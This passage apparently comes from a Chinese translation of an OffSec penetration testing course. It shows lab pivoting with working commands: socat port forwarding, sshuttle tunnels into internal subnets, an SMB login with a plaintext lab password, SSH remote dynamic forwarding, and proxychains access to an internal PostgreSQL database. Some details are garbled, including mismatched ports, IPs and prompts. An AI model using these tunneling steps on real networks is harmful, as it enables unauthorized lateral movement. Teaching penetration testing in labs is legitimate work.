
<bin$ `socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

列出 554 - 将 `CONFERENCE01` 上的 `2222` 端口转发到 `PGDATABASE` 的 `22` 端口

接下来，我们可以运行 `sshuttle`，使用我们使用的 SSH 连接字符串，以及我们将通过此连接建立隧的子网（`10.4.50.0/24` 和 `172.16.50.0/24`）。

```
kali@kali:-$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
[local] sudo Password:
```

```
database_admin@192.168.50.63's password:
```

```
c : Connected to server.
Failed to flush caches: Unit dbus-freesktop.resolve.service not found.
Received non-zero return code 1 when flushing DNS resolver cache.
```

列出 555 - 从我们的 Kali 机器上运行 `sshuttle`，指向 `CONFERENCE01` 上的转发端口。虽然我们不需要离开子网，但理论上，它应该已经在我们的 Kali 机器上设置了路由，使得我们对子网主机发出的任何请求都将通过 SSH 连接推送。让我们在新的终端中尝试连接 SMB `HRSHARES` 来测试这是否有效。

```
kali@kali:-$ smbclient -U //172.16.50.217 -U hr_admin --password=Welcome1234
```

| Sharename | Type | Comment |
|---|---|---|
| ADMIN$ | Disk | Remote Admin |
| CS | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| scripts | Disk | |

重新连接到 SMB1 以列出工作组。

`do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)`

`Unable to connect with SMB -- no workgroup available`

```
kali@kali:-$
```

列出 556 - 连接到 `HRSHARES` 上的 SMB 共享，无需显式转发。太棒了！我们现在透明地连接到 `HRSHARES`，就像我们处于同一个网络并具有直接访问权限一样。在本节中，我们使用 `sshuttle` 创建一个类似 VPN 的环境。然后我们能够从 Kali 机器透明地连接到 `HRSHARES`，就像我们处于 `PGDATABASE` 同一个网络一样。

# OffSec

## 使用 Kali Linux 进行渗透测试

```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\exe
```

```
C:\Users\rdp_admin>
```

列表 559 - 在 `MULTISERVER03` 上查找 `ssh.exe`。

成功！我们在这台机器上找到了 `ssh.exe`。

值得注意的是，Windows 自带的 OpenSSH 版本高于 7.6，这意味着我们可以使用它进行远程动态端口转发。

```
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1pi1, LibreSSL 3.0.2
```

列表 560 - Windows 自带的 OpenSSH 客户端版本高于 7.6。

我们现在可以像之前那样为我们的 Kali 机器创建一个远程动态端口转发。

我们将端口 `9998` 传递给 `R`，以 Kali 机器上的 `kali` 用户身份身份验证。

```
kali@rdp_admin:$ssh -N -R 9998 kali@192.168.118.4
The authenticity of '192.168.118.4' (192.168.118.4) can't be established.
ECDSA fingerprint is SHA256:0aaFtT2lzP9mRmoxihbVJX/IjIhHJYVfBFfMn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
kali@192.168.118.4:password:
```

列表 561 - 连接回 Kali 机器端口以打开远程动态端口转发。

我们使用 `ss` 检查 Kali 机器上是否开启了 SOCKS 代理端口。

```
kali@kali:$ ss -ntpllu
Netid State Recv-Q Send- Local Address:Port
tcp Process
tcp LISTEN 0 128 127.0.0.1:9998
0.0.0.0:* LISTEN 0 128 0.0.0.0:22
0.0.0.0:* LISTEN 0 128 [::]:22
tcp [::]:* LISTEN 0 128 [::]:22
```

列表 562 - 使用 `ss` 检查 Kali 机器上是否开启了 SOCKS 代理端口。

更新 `/etc/proxchains4.conf` 以使用此配置。

```
kali@kali:$ tail /etc/proxchains4.conf
# proxy types: http, socks4, socks5, raw
#
    * raw: 流量直接转发到代理而不进行任何修改。
# (auth types supported: "basic" user/pass-socks)
#
[ProxyList]
# add proxy here ...
#    meanwhile
# defaults set to "tor"
socks5 127.0.0.1 9998
```

列表 563 - 代理配置文件已修改。

PWK - © 2023 OffSec Services Limited. 保留所有权利。

制作于摩洛哥

# OffSec

## 使用 Kali Linux 进行渗透测试

现在配置指向了我们的远程动态转发 SOCKS 端口，我们可以通过代理运行 `psql` 来以 `postgres` 用户身份连接到 PostgreSQL 数据库。如果我们直接从 `MULTISERVER02` 连接，将使用相同的 `psql` 命令。

```
kali:~$ psql -h 10.48.50.215 -U postgres
[proxchains] config file loaded: /etc/proxchains.conf
[proxchains] preloading /usr/lib/x86_64-linux-gnu/libproxchains.so.4
[proxchains] DLL init: proxies-ng 4.16
[proxchains] DLL init: proxies-ng 4.16
[proxchains] Strict chain ... 127.0.0.1:1998 ... 10.48.50.215:5432 OK
Password for user postgres:
[proxchains] Strict chain ... 127.0.0.1:1998 ... 10.48.50.215:5432 OK
psql (echo 14.2+b1), server 11 (Ubuntu 22.04-1ubuntu0.20.04.1)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
compression: off)
Type "help" for help.
postgres=# \l
```

数据库列表

| Name | Owner | Encoding | Collate | Ctype | Access privileges |
| --- | --- | --- | --- | --- | --- |
| confluence | postgres | UTF8 | en_US_UTF | en_US_UTF | |
| postgres | postgres | UTF8 | en_US_UTF | en_US_UTF | =c/postgres + |
| template0 | postgres | UTF8 | | | =c/postgres:CTC/postgres |
